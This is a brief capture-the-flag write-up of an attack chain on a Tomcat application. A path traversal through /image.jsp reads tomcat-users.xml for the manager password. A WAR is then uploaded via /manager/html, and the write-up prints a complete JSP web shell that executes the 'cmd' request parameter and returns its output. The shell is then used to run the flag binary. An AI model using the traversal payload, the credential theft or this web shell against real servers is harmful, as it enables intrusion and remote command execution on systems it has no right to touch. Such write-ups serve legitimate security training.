
First read file content by exploit path traversal at /image.jsp?file=FILE

Read ../../../conf/tomcat-users.xml to get the password of tomcat user 

Then go to /manager/html interface to upload shell war file

```java
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr); 
            disr = dis.readLine(); 
        }
    }
%>
```

Then go to /shell/shell.jsp?cmd=/bin/sh+-c+/flag
To get the flag

the flag is a execute file so it cant be read by using cat command.